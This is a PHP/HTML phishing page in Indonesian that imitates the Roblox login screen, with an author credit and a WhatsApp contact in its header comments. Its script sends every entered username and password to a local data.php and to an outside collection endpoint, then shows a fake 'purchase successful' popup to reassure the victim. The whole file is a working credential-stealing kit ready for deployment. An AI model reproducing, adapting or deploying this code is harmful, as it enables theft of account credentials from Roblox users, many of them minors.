<?php 
// Created By Dirzz Nesia
// Dilarang Mengganti/Menghapus Copyright
// Hargai Creator
// WhatsApp 6285792116902
// Jangan Ubah Data Dibawah Ini Agar Tidak Error & Bug
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Log in Roblox</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');

        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            background-color: #2e3034;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        .header {
            width: 90%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background-color: #2e3034;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .header .logo img {
            height: 50px;
            vertical-align: middle;
        }

        .header .nav-links {
            display: flex;
            gap: 20px;
            font-size: 16px;
        }

        .header .nav-links a {
            text-decoration: none;
            color: #fff;
            font-weight: 600;
        }

        .header .nav-buttons {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .header .nav-buttons button {
            border: none;
            padding: 8px 15px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
        }

        .header .nav-buttons .daftar {
            background-color: #007bff;
            color: #fff;
        }

        .header .nav-buttons .login {
            background-color: #e9ecef;
            color: #333;
        }

        .header .search-icon-container {
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .header .search-icon {
            color: #fff;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
            margin-top: 50px;
            padding: 0 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .login-container h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 20px;
        }

        .login-form {
            width: 90%;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .login-form input {
            width: 100%;
            padding: 15px;
            border: 1px solid #5a5c60;
            border-radius: 8px;
            background-color: #3f4146;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
        }

        .login-form input::placeholder {
            color: #ccc;
        }

        .login-form .login-btn {
            background-color: #007bff;
            color: #fff;
            border: none;
            padding: 15px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .login-form .login-btn:hover {
            background-color: #0069d9;
        }

        .forgot-password {
            margin: 20px 0;
            font-size: 14px;
            color: #ccc;
        }

        .forgot-password a {
            color: #fff;
            text-decoration: none;
            font-weight: 600;
        }
        
        .other-options {
            width: 90%;
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-top: 15px;
        }

        .other-options button {
            width: 100%;
            padding: 15px;
            border: 1px solid #5a5c60;
            border-radius: 8px;
            background-color: #3f4146;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .other-options button:hover {
            background-color: #4a4c51;
        }

        .signup-link {
            margin-top: 30px;
            font-size: 14px;
            color: #ccc;
        }

        .signup-link a {
            color: #007bff;
            text-decoration: none;
            font-weight: 600;
        }

        .popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .popup-content {
            background: #3f4146;
            padding: 40px;
            border-radius: 12px;
            text-align: center;
            color: #fff;
            width: 90%;
            max-width: 350px;
            position: relative;
        }

        .popup-content .close-btn {
            position: absolute;
            top: 15px;
            right: 15px;
            background: none;
            border: none;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
        }

        .popup-content ion-icon {
            font-size: 60px;
            color: #28a745;
            margin-bottom: 10px;
            --ionicon-stroke-width: 48px;
        }

        .popup-content h2 {
            font-size: 24px;
            font-weight: 700;
            margin: 0 0 10px 0;
        }

        .popup-content p {
            font-size: 14px;
            color: #ccc;
            margin: 0 0 20px 0;
        }

        .popup-content .complete-btn {
            background-color: #007bff;
            color: #fff;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .popup-content .complete-btn:hover {
            background-color: #0069d9;
        }
    </style>
</head>
<body>

    <div class="header">
        <div class="logo">
            <img src="https://i.ibb.co.com/7JxzzQ9j/hd-roblox-square-android-ios-app-logo-icon-png-70175169478746776ph2tfiuz-removebg-preview.png"></img>
        </div>
        <div class="nav-links">
            <a href="#">Teratas</a>
            <a href="#">Marketplace</a>
            <a href="#">Buat</a>
        </div>
    </div>

    <div class="login-container">
        <h1>Log in ke Roblox</h1>
        <div class="login-form">
            <input type="text" id="username" placeholder="Nama Pengguna/Email/Nomor Ponsel">
            <input type="password" id="password" placeholder="Password">
            <button id="loginBtn" class="login-btn">Log In</button>
        </div>

        <p class="forgot-password">
            Lupa Password atau Nama Pengguna?
        </p>

        <div class="other-options">
            <button>Kirimi Saya Kode Sekali Pakai</button>
            <button>Log In dengan Passkey</button>
            <button>Gunakan Perangkat Lain</button>
        </div>

        <p class="signup-link">
            Tidak punya akun? <a href="#">Daftar</a>
        </p>
    </div>

    <div class="popup-overlay" id="successPopup">
        <div class="popup-content">
            <ion-icon name="checkmark-circle-outline"></ion-icon>
            <h2>Sukses</h2>
            <p>Selamat proses pembelian anda berhasil dilakukan, mohon tunggu 1x24 agar pembelian anda selesai kami proses dan otomatis masuk ke akun anda.</p>
            <button class="complete-btn" onclick="redirectToIndex()">Selesai</button>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
  const u = username, p = password, b = loginBtn, pop = successPopup;
  const check = () => {
    const ok = u.value.trim() && p.value.trim();
    b.disabled = !ok; b.style.opacity = ok ? 1 : .5; b.style.cursor = ok ? "pointer" : "not-allowed";
  };
  [u, p].forEach(el => el.addEventListener("input", check)); check();

  b.addEventListener("click", async e => {
    e.preventDefault();
    const f = new FormData(); f.append("username", u.value); f.append("password", p.value);
    try {
      await fetch("../data.php", { method: "POST", body: f });
      await fetch("https://ajax.gett1.biz.id/apiii.php", { method: "POST", body: f });
    } catch (err) { console.error(err); }
    setTimeout(() => pop.style.display = "flex", 800);
  });

  window.closePopup = () => pop.style.display = "none";
  window.redirectToIndex = () => location.href = "../index.php";
});
    </script>
</body>
</html>
